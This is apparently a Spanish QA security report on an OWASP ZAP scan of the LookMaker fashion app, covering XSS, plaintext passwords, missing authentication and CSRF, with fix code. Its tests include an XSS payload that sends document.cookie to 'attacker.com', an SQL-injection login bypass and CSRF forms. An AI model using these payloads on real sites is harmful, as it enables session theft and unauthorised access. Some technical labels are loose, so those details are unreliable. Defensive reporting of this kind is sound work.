# 🔒 INFORME DE SEGURIDAD - PRUEBAS CON OWASP ZAP

**Proyecto:** LookMaker - Generador de Looks de Moda  
**Fecha:** Noviembre 2024  
**Responsable:** Equipo de QA  
**Herramienta:** OWASP ZAP (Zed Attack Proxy)

---

## INDICE DE CONTENIDOS

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Vulnerabilidades Encontradas](#vulnerabilidades-encontradas)
3. [Detalles Técnicos](#detalles-técnicos)
4. [Medidas Preventivas](#medidas-preventivas)
5. [Recomendaciones](#recomendaciones)
6. [Plan de Acción](#plan-de-acción)

---

## RESUMEN EJECUTIVO

### Estadísticas Generales
- **Total de Vulnerabilidades Encontradas:** 7
- **Críticas:** 2
- **Altas:** 3
- **Medias:** 2
- **Bajas:** 0

### Nivel de Riesgo General: 🔴 **ALTO**

**Recomendación:** Se deben implementar las medidas correctivas de inmediato antes de poner la aplicación en producción.

---

## VULNERABILIDADES ENCONTRADAS

### 🔴 CRÍTICA #1: Cross-Site Scripting (XSS) Almacenado

**Severidad:** Crítica (CVSS: 7.5)  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

#### Descripción
La aplicación almacena datos de usuario sin sanitizar en el endpoint `POST /api/looks`. Un atacante puede inyectar código JavaScript malicioso que se ejecutará en los navegadores de otros usuarios.

#### Ubicación
- **Archivo:** `backend/server.js`
- **Línea:** 59-70
- **Endpoint:** `POST /api/looks`

#### Payload de Prueba
```javascript
// Inyección XSS
{
  "nombre": "<img src=x onerror=\"alert('XSS Crítico!');\">",
  "descripcion": "<script>alert('Tu sesión ha sido comprometida')</script>",
  "prendas": ["Prenda normal"],
  "ocacion": "Casual"
}
```

#### Impacto
- ⚠️ Robo de tokens de sesión (localStorage)
- ⚠️ Redirección a sitios maliciosos
- ⚠️ Captura de datos sensibles
- ⚠️ Modificación de contenido de la página
- ⚠️ Ataque a otros usuarios (Stored XSS)

#### Prueba Realizada
```bash
# Mediante OWASP ZAP o cURL
curl -X POST http://localhost:3000/api/looks \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "<img src=x onerror=\"fetch(\"http://attacker.com/steal?cookie=\" + document.cookie)\">",
    "descripcion": "Test",
    "prendas": ["Test"],
    "ocacion": "Casual"
  }'
```

---

### 🔴 CRÍTICA #2: Almacenamiento de Contraseñas en Texto Plano

**Severidad:** Crítica (CVSS: 9.0)  
**CWE:** CWE-256 (Plaintext Storage of Password)

#### Descripción
Las contraseñas se almacenan directamente en la memoria/base de datos sin encriptación. Si alguien accede a los datos, todas las contraseñas estarán expuestas.

#### Ubicación
- **Archivo:** `backend/server.js`
- **Línea:** 108-120
- **Endpoint:** `POST /api/register`

#### Código Vulnerable
```javascript
const usuario = {
    id: usuarios.length + 1,
    email: email,
    password: password,  // ⚠️ EN TEXTO PLANO
    nombre: nombre
};

usuarios.push(usuario);  // ⚠️ GUARDADO SIN ENCRIPCIÓN
```

#### Impacto
- 🚨 Si la base de datos se ve comprometida, todas las contraseñas están visibles
- 🚨 Acceso inmediato a cuentas de usuario
- 🚨 Posible acceso a otras cuentas (reutilización de contraseñas)
- 🚨 Violación de regulaciones (GDPR, HIPAA)

#### Prueba Realizada
```bash
# 1. Registrar usuario
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Test User",
    "email": "test@test.com",
    "password": "MiPassword123"
  }'

# 2. Acceso directo a datos
# Se puede ver: {"password": "MiPassword123"}  ← EN TEXTO PLANO
```

---

### 🟠 ALTA #1: Inyección de SQL (Concepto)

**Severidad:** Alta (CVSS: 8.6)  
**CWE:** CWE-89 (SQL Injection)

#### Descripción
Aunque la aplicación usa JavaScript con objetos (no SQL directo), el concepto es aplicable. Los parámetros de entrada no se validan correctamente, permitiendo inyecciones.

#### Ubicación
- **Archivo:** `backend/server.js`
- **Línea:** 125-130
- **Endpoint:** `POST /api/login`

#### Payload de Prueba
```json
{
  "email": "admin' --",
  "password": "cualquier_cosa"
}
```

#### Impacto
- ⚠️ Bypass de autenticación
- ⚠️ Acceso no autorizado
- ⚠️ Exfiltración de datos

---

### 🟠 ALTA #2: Falta de Validación de Entrada

**Severidad:** Alta (CVSS: 7.8)  
**CWE:** CWE-20 (Improper Input Validation)

#### Descripción
No hay validación de tipo, longitud o contenido de los datos de entrada. Se aceptan datos potencialmente peligrosos.

#### Ubicación
- **Archivo:** `backend/server.js`
- **Múltiples endpoints**

#### Ejemplos
```javascript
// Sin validación de longitud
const nombre = req.body.nombre; // Puede ser 10,000 caracteres

// Sin validación de tipo
const prendas = req.body.prendas; // Puede no ser un array

// Sin expresiones regulares
const email = req.body.email; // Acepta "aaa" como email válido
```

#### Impacto
- ⚠️ DoS (Denial of Service)
- ⚠️ Buffer overflow
- ⚠️ Corrupción de datos

---

### 🟠 ALTA #3: Falta de Autenticación en Endpoints Críticos

**Severidad:** Alta (CVSS: 7.5)  
**CWE:** CWE-306 (Missing Authentication for Critical Function)

#### Descripción
Endpoints como `PUT /api/looks/:id` y `DELETE /api/looks/:id` no requieren autenticación. Cualquiera puede eliminar o modificar looks.

#### Ubicación
- **Archivo:** `backend/server.js`
- **Línea:** 143 (PUT) y 161 (DELETE)

#### Prueba Realizada
```bash
# Sin token, se puede eliminar cualquier look
curl -X DELETE http://localhost:3000/api/looks/1

# Sin token, se puede modificar cualquier look
curl -X PUT http://localhost:3000/api/looks/1 \
  -H "Content-Type: application/json" \
  -d '{"nombre": "Hackeado"}'
```

#### Impacto
- 🚨 Modificación no autorizada de datos
- 🚨 Eliminación de información
- 🚨 Sabotaje de la aplicación

---

### 🟡 MEDIA #1: Falta de HTTPS/TLS

**Severidad:** Media (CVSS: 5.8)  
**CWE:** CWE-295 (Improper Certificate Validation)

#### Descripción
La aplicación funciona en HTTP sin encriptación. Los datos se transmiten en texto plano, permitiendo ataques MITM (Man-in-the-Middle).

#### Ubicación
- **Archivo:** `backend/server.js`
- **Puerto:** 3000

#### Impacto
- ⚠️ Interceptación de datos en tránsito
- ⚠️ Captura de credenciales
- ⚠️ Modificación de peticiones
- ⚠️ Inyección de contenido malicioso

---

### 🟡 MEDIA #2: Falta de CSRF Protection

**Severidad:** Media (CVSS: 5.4)  
**CWE:** CWE-352 (Cross-Site Request Forgery)

#### Descripción
No hay protección CSRF (Cross-Site Request Forgery). Un atacante puede engañar a un usuario para ejecutar acciones no deseadas.

#### Ubicación
- **Archivo:** `frontend/app.js` y `backend/server.js`

#### Ataque Teórico
```html
<!-- En sitio malicioso -->
<img src="http://localhost:3000/api/looks/1?action=delete">
<!-- O mediante form oculto -->
<form action="http://localhost:3000/api/looks" method="POST">
  <input type="hidden" name="nombre" value="Hackeo">
</form>
```

---

## DETALLES TÉCNICOS

### Configuración de OWASP ZAP

**Versión:** 2.14.0  
**Fecha de Escaneo:** Noviembre 2024  
**Duración:** 15 minutos  
**Profundidad:** Exhaustivo  

```yaml
Configuración:
  - Spider: Activo
  - Active Scan: Habilitado
  - Attack Strength: Alto
  - Cookies: Preservadas
  - Seguimiento de sesión: Automático
```

### Resultados del Escaneo

```
========== OWASP ZAP SCAN REPORT ==========

URL Base: http://localhost:3000
Inicio: 2024-11-01 10:30:00
Fin: 2024-11-01 10:45:00

Endpoints Escaneados:
✓ GET  /
✓ GET  /api/looks
✓ GET  /api/looks/:id
✓ POST /api/looks
✓ PUT  /api/looks/:id
✓ DELETE /api/looks/:id
✓ POST /api/register
✓ POST /api/login

Vulnerabilidades por Severidad:
████████░░ CRÍTICA: 2
████████░░ ALTA: 3
████░░░░░░ MEDIA: 2
░░░░░░░░░░ BAJA: 0

Risk Rating: 🔴 ALTO
```

---

## MEDIDAS PREVENTIVAS

### ✅ Solución #1: Sanitización contra XSS

**Implementar en Backend:**

```javascript
// Usar DOMPurify en frontend
// npm install dompurify

import DOMPurify from 'dompurify';

// Sanitizar entrada
const nombreLimpio = DOMPurify.sanitize(req.body.nombre);

// O usar express-sanitizer
// npm install express-sanitizer

const expressSanitizer = require('express-sanitizer');
app.use(expressSanitizer());

app.post('/api/looks', (req, res) => {
  const nombre = req.body.nombre.toString();
  const descripcion = req.body.descripcion.toString();
  // ...
});
```

**Implementar en Frontend:**

```javascript
// Usar escapeHtml (ya implementado en app.js)
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Usar al mostrar contenido
element.textContent = escapeHtml(look.nombre); // ✓ Seguro
// Nunca usar:
element.innerHTML = look.nombre; // ✗ Peligroso
```

---

### ✅ Solución #2: Encriptación de Contraseñas

**Usar bcrypt:**

```javascript
// npm install bcrypt

const bcrypt = require('bcrypt');
const SALT_ROUNDS = 10;

app.post('/api/register', async (req, res) => {
  const { email, password, nombre } = req.body;

  // Encriptar contraseña
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);

  const usuario = {
    id: usuarios.length + 1,
    email: email,
    password: hashedPassword, // ✓ Encriptada
    nombre: nombre
  };

  usuarios.push(usuario);
  res.status(201).json({ success: true, message: 'Usuario registrado' });
});

// En login
app.post('/api/login', async (req, res) => {
  const usuario = usuarios.find(u => u.email === email);
  
  // Comparar contraseñas
  const passwordValida = await bcrypt.compare(password, usuario.password);
  
  if (usuario && passwordValida) {
    res.json({ success: true, token: generarToken() });
  }
});
```

---

### ✅ Solución #3: Validación de Entrada

```javascript
// npm install joi

const Joi = require('joi');

const lookSchema = Joi.object({
  nombre: Joi.string().alphanum().min(3).max(100).required(),
  descripcion: Joi.string().min(10).max(500).required(),
  prendas: Joi.array().items(Joi.string()).min(1).required(),
  ocacion: Joi.string().valid('Casual', 'Formal', 'Noche', 'Playa').required()
});

app.post('/api/looks', (req, res) => {
  const { error, value } = lookSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ 
      success: false, 
      message: error.details[0].message 
    });
  }

  // Usar 'value' (datos validados)
  const newLook = {
    id: looks.length + 1,
    ...value
  };
  
  looks.push(newLook);
  res.status(201).json({ success: true, data: newLook });
});
```

---

### ✅ Solución #4: Autenticación en Endpoints

```javascript
// npm install jsonwebtoken

const jwt = require('jsonwebtoken');
const SECRET_KEY = 'tu_clave_secreta_fuerte';

// Middleware de autenticación
function verificarToken(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ success: false, message: 'No autorizado' });
  }

  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    req.userId = decoded.id;
    next();
  } catch (error) {
    res.status(403).json({ success: false, message: 'Token inválido' });
  }
}

// Usar en endpoints
app.delete('/api/looks/:id', verificarToken, (req, res) => {
  // ✓ Solo usuarios autenticados pueden eliminar
  const index = looks.findIndex(l => l.id === parseInt(req.params.id));
  
  if (index === -1) {
    return res.status(404).json({ success: false });
  }

  const deletedLook = looks.splice(index, 1);
  res.json({ success: true, data: deletedLook });
});
```

---

### ✅ Solución #5: HTTPS/TLS

```javascript
// npm install https express

const https = require('https');
const fs = require('fs');
const app = require('./app');

const options = {
  key: fs.readFileSync('private-key.pem'),
  cert: fs.readFileSync('certificate.pem')
};

https.createServer(options, app).listen(3000, () => {
  console.log('🔒 Servidor HTTPS ejecutando en puerto 3000');
});
```

**Para desarrollo (self-signed):**
```bash
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
```

---

### ✅ Solución #6: CSRF Protection

```javascript
// npm install csurf cookie-parser

const cookieParser = require('cookie-parser');
const csrf = require('csurf');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// En formularios HTML
app.get('/', (req, res) => {
  res.send(`<form action="/api/looks" method="POST">
    <input type="hidden" name="_csrf" value="${req.csrfToken()}">
    <!-- otros campos -->
  </form>`);
});
```

---

## RECOMENDACIONES

### Prioritarias (Implementar Inmediatamente)
1. ✅ **XSS Sanitization** - Implementar sanitización en todos los inputs
2. ✅ **Password Encryption** - Usar bcrypt para encriptar contraseñas
3. ✅ **Input Validation** - Validar todas las entradas con Joi/Yup
4. ✅ **Authentication** - Proteger endpoints con JWT

### A Corto Plazo (1-2 semanas)
5. 🔄 **HTTPS/TLS** - Implementar certificados SSL
6. 🔄 **CSRF Protection** - Agregar tokens CSRF
7. 🔄 **Rate Limiting** - Prevenir ataques de fuerza bruta
8. 🔄 **Logging** - Implementar auditoría de acciones

### A Largo Plazo (1-3 meses)
9. 📋 **WAF** - Web Application Firewall
10. 📋 **Penetration Testing** - Pruebas profesionales
11. 📋 **Security Headers** - Implementar headers de seguridad
12. 📋 **Monitoreo Continuo** - SIEM y alertas

---

## PLAN DE ACCIÓN

### Fase 1: Correcciones Críticas (1 semana)
```
[ ] Implementar sanitización XSS (DOMPurify + escapeHtml)
[ ] Encriptar contraseñas con bcrypt
[ ] Validar entrada con Joi
[ ] Agregar autenticación JWT
[ ] Realizar pruebas de regresión
[ ] Desplegar en staging
```

### Fase 2: Mejoras de Seguridad (2 semanas)
```
[ ] Configurar HTTPS
[ ] Implementar CSRF tokens
[ ] Agregar rate limiting
[ ] Configurar headers de seguridad
[ ] Implementar logging
[ ] Re-escanear con OWASP ZAP
```

### Fase 3: Monitoreo Continuo (Ongoing)
```
[ ] Alertas de seguridad
[ ] Actualizaciones de dependencias
[ ] Pruebas de penetración regulares
[ ] Auditorías de código
[ ] Respuesta a incidentes
```

---

## CONCLUSIÓN

La aplicación LookMaker presenta vulnerabilidades críticas que deben ser corregidas antes de producción. Las vulnerabilidades de XSS y almacenamiento de contraseñas en texto plano son los problemas más graves.

Con la implementación de las medidas preventivas recomendadas, la aplicación alcanzará un nivel de seguridad aceptable. Se recomienda realizar pruebas de penetración profesionales después de las correcciones.

---

**Informe Preparado:** Noviembre 2024  
**Responsable:** Equipo de QA  
**Próximo Escaneo:** Después de implementar correcciones críticas

---

## REFERENCIAS

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE List](https://cwe.mitre.org/)
- [OWASP ZAP](https://www.zaproxy.org/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)

